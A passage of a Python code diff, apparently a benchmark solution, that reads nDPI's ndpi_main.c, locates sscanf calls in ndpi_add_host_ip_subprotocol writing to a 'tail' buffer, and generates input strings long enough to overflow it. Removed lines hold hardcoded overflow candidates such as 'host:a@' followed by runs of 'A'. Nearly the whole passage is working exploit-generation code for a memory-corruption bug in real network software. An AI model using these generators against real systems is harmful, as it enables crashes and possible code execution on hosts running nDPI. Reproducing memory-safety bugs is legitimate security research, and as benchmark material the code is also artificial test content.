+            lo = ord(last)
+            hi = ord(nxt)
+            o = ord(ch)
+            if lo <= hi:
+                if lo <= o <= hi:
+                    return True
+            else:
+                if hi <= o <= lo:
+                    return True
+            last = None
+            i += 2
             continue
-        end = _find_matching(func_body, paren_pos, "(", ")")
-        if end < 0:
+        if ch == c:
+            return True
+        last = c
+        i += 1
+    return False
+
+
+def _choose_char_for_scanset(raw: str, is_tail: bool = False) -> str:
+    negate, setpart = _parse_scanset(raw)
+    preferred = ["A", "a", "1", "0", ".", "_", "-", "Z", "b", "9"]
+    if is_tail:
+        preferred = ["A", "Z", "a", "1", "0", ".", "_", "-"]
+    for ch in preferred:
+        in_set = _is_char_in_scanset(ch, setpart)
+        ok = (not in_set) if negate else in_set
+        if ok:
+            return ch
+    for o in range(33, 127):
+        ch = chr(o)
+        in_set = _is_char_in_scanset(ch, setpart)
+        ok = (not in_set) if negate else in_set
+        if ok:
+            return ch
+    return "A"
+
+
+def _parse_scanf_conversions(fmt: str) -> List[Dict[str, Any]]:
+    convs: List[Dict[str, Any]] = []
+    i = 0
+    n = len(fmt)
+    while i < n:
+        if fmt[i] != "%":
+            i += 1
             continue
-        call_inside = func_body[paren_pos + 1:end]
-        args = _split_c_args(call_inside)
-        if len(args) < 3:
+        if i + 1 < n and fmt[i + 1] == "%":
+            i += 2
             continue
-        fmt_expr = args[1].lstrip()
-        if not fmt_expr.startswith('"'):
-            continue
-        fmt, _ = _parse_c_string_literal(fmt_expr, fmt_expr.find('"'))
-        varargs = args[2:]
-        tail_pos = None
-        for i, a in enumerate(varargs):
-            if re.search(r"\btail\b", a):
-                tail_pos = i
+        i += 1
+        suppressed = False
+        if i < n and fmt[i] == "*":
+            suppressed = True
+            i += 1
+        width_digits = []
+        while i < n and fmt[i].isdigit():
+            width_digits.append(fmt[i])
+            i += 1
+        width = int("".join(width_digits)) if width_digits else None
+
+        if i < n and fmt[i] == "$" and width_digits:
+            while i < n and fmt[i] == "$":
+                i += 1
+            width = None
+
+        if i < n and fmt[i] in "hljztL":
+            if fmt[i] in "hl" and i + 1 < n and fmt[i + 1] == fmt[i]:
+                i += 2
+            else:
+                i += 1
+            if i < n and fmt[i] in "hljztL":
+                i += 1
+
+        if i >= n:
+            break
+        spec = fmt[i]
+        i += 1
+        scanset_raw = None
+        if spec == "[":
+            j = i
+            if j < n and fmt[j] == "]":
+                j += 1
+            while j < n:
+                if fmt[j] == "]":
+                    break
+                j += 1
+            scanset_raw = fmt[i:j] if j <= n else fmt[i:]
+            i = j + 1 if j < n else n
+        convs.append({"spec": spec, "suppressed": suppressed, "width": width, "scanset": scanset_raw})
+    return convs
+
+
+def _generate_input_from_format(fmt: str, tail_assign_index: int, tail_buf_size: int) -> str:
+    i = 0
+    n = len(fmt)
+    assign_idx = 0
+    out = []
+    last_was_space = False
+
+    def add_space():
+        nonlocal last_was_space
+        if out and not last_was_space:
+            out.append(" ")
+            last_was_space = True
+
+    def add_lit(ch: str):
+        nonlocal last_was_space
+        out.append(ch)
+        last_was_space = ch.isspace()
+
+    while i < n:
+        c = fmt[i]
+        if c == "%":
+            if i + 1 < n and fmt[i + 1] == "%":
+                add_lit("%")
+                i += 2
+                continue
+            i += 1
+            suppressed = False
+            if i < n and fmt[i] == "*":
+                suppressed = True
+                i += 1
+            while i < n and fmt[i].isdigit():
+                i += 1
+            if i < n and fmt[i] == "$":
+                while i < n and fmt[i] == "$":
+                    i += 1
+            if i < n and fmt[i] in "hljztL":
+                if fmt[i] in "hl" and i + 1 < n and fmt[i + 1] == fmt[i]:
+                    i += 2
+                else:
+                    i += 1
+                if i < n and fmt[i] in "hljztL":
+                    i += 1
+            if i >= n:
                 break
-        if tail_pos is None:
+            spec = fmt[i]
+            i += 1
+            scanset_raw = None
+            if spec == "[":
+                j = i
+                if j < n and fmt[j] == "]":
+                    j += 1
+                while j < n and fmt[j] != "]":
+                    j += 1
+                scanset_raw = fmt[i:j] if j <= n else fmt[i:]
+                i = j + 1 if j < n else n
+
+            is_tail = (not suppressed) and (assign_idx == tail_assign_index)
+            if spec in "diuoxX":
+                tok = "1"
+            elif spec in "aAeEfFgG":
+                tok = "1"
+            elif spec == "p":
+                tok = "1"
+            elif spec == "c":
+                tok = "A" if is_tail else "a"
+            elif spec == "s":
+                tok = ("A" * max(1, tail_buf_size)) if is_tail else "a"
+            elif spec == "n":
+                tok = ""
+            elif spec == "[":
+                ch = _choose_char_for_scanset(scanset_raw or "", is_tail=is_tail)
+                tok = (ch * max(1, tail_buf_size)) if is_tail else ch
+            else:
+                tok = ("A" * max(1, tail_buf_size)) if is_tail else "a"
+
+            if tok:
+                out.append(tok)
+                last_was_space = tok[-1].isspace()
+
+            if not suppressed:
+                assign_idx += 1
             continue
-        calls.append({
-            "start": start,
-            "end": end,
-            "args": args,
-            "fmt": fmt,
-            "tail_vararg_index": tail_pos,
-        })
-    return calls
+        if c.isspace():
+            add_space()
+            i += 1
+            continue
+        add_lit(c)
+        i += 1
+
+    return "".join(out)
+
+
+def _get_format_string(arg: str, defines: Dict[str, str]) -> Optional[str]:
+    s = _extract_c_string_literals(arg)
+    if s:
+        return s
+    name = _clean_c_expr(arg)
+    if re.fullmatch(r'[A-Za-z_]\w*', name) and name in defines:
+        return defines[name]
+    return None
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        ndpi_main = _read_text_from_archive(src_path, "src/lib/ndpi_main.c")
-        if ndpi_main is None:
-            # fallback: try any ndpi_main.c
-            ndpi_main = _read_text_from_archive(src_path, "ndpi_main.c")
-        if ndpi_main is None:
-            return (b"A" * 256) + b"\n"
+        text = _read_ndpi_main(src_path)
+        if not text:
+            return b"A" * 56
 
-        ndpi_main_nc = _strip_c_comments(ndpi_main)
-        func = _extract_function(ndpi_main_nc, "ndpi_add_host_ip_subprotocol")
-        if func is None:
-            return (b"A" * 256) + b"\n"
+        defines = _build_string_define_map(text)
+        func_text = _extract_function(text, "ndpi_add_host_ip_subprotocol")
+        if not func_text:
+            func_text = text
 
-        tail_size, tail_expr = _extract_tail_size(func)
-        if tail_size is None and tail_expr:
-            hdrs = _read_many_texts_from_archive(
-                src_path,
-                [
-                    "src/include/ndpi_api.h",
-                    "src/include/ndpi_typedefs.h",
-                    "src/include/ndpi_main.h",
-                    "src/lib/ndpi_main.c",
-                    "include/ndpi_api.h",
-                    "include/ndpi_typedefs.h",
-                    "include/ndpi_main.h",
-                ],
-            )
-            macros = _collect_macros(hdrs + [ndpi_main_nc])
-            ts = _resolve_tail_size(tail_expr, macros)
-            if ts is not None and ts > 0:
-                tail_size = ts
+        tail_size = _find_tail_buffer_size(func_text, text, defines)
+        calls = _extract_calls(func_text, "sscanf")
 
-        if tail_size is None or tail_size <= 0 or tail_size > 1_000_000:
-            tail_size = 64
+        best: Optional[str] = None
+        best_len = 10**18
 
-        calls = _find_sscanf_calls_with_tail(func)
-        best = None
-        best_line = None
-        for c in calls:
-            fmt = c["fmt"]
-            convs = _parse_format_conversions(fmt)
-
-            # map vararg indices to conversion indices (non-suppressed, excluding %%)
-            non_supp = []
-            for cc in convs:
-                if cc["conv"] == "%":
-                    continue
-                if cc["suppressed"]:
-                    continue
-                non_supp.append(cc)
-
-            tail_arg_idx = c["tail_vararg_index"]
-            if tail_arg_idx < 0 or tail_arg_idx >= len(non_supp):
+        for call in calls:
+            if "tail" not in call:
                 continue
-            tail_conv = non_supp[tail_arg_idx]
-            conv_type = tail_conv["conv"]
-            width = tail_conv["width"]
-
-            # overflow likely if width is missing or >= tail_size
-            if conv_type not in ("s", "["):
+            args = _get_call_args(call)
+            if not args or len(args) < 3:
                 continue
-            if width is not None and width < tail_size:
+            tail_arg_idx = _find_tail_arg_index(args)
+            if tail_arg_idx is None:
                 continue
 
-            overflow_len = tail_size
-            line = _build_input_from_format(fmt, tail_arg_idx, overflow_len)
-            if not line:
+            fmt = _get_format_string(args[1], defines)
+            if not fmt:
                 continue
-            bline = (line + "\n").encode("ascii", errors="ignore")
-            if best_line is None or len(bline) < len(best_line):
-                best_line = bline
-                best = c
 
-        if best_line is not None and len(best_line) > 0:
-            return best_line
+            convs = _parse_scanf_conversions(fmt)
+            non_suppressed = [c for c in convs if not c.get("suppressed")]
+            tail_assign_idx = tail_arg_idx - 2
+            if tail_assign_idx < 0 or tail_assign_idx >= len(non_suppressed):
+                continue
+            tail_conv = non_suppressed[tail_assign_idx]
+            spec = tail_conv.get("spec")
+            width = tail_conv.get("width")
+            if spec not in ("s", "["):
+                continue
+            if width is not None and width <= (tail_size - 1):
+                continue
 
-        # Conservative fallback: common rule patterns in nDPI custom rules; long tail
-        overflow = b"A" * tail_size
-        candidates = [
-            b"host:a@" + overflow + b"\n",
-            b"ip:1.1.1.1@" + overflow + b"\n",
-            b"1.1.1.1," + overflow + b"\n",
-            b"a," + overflow + b"\n",
-        ]
-        return min(candidates, key=len)
+            inp = _generate_input_from_format(fmt, tail_assign_idx, tail_size)
+            if not inp:
+                continue
+
+            inp = inp.rstrip("\n")
+            if len(inp) < best_len:
+                best = inp
+                best_len = len(inp)
+
+        if best is None:
+            return b"A" * 56
+        return best.encode("latin-1", errors="ignore")
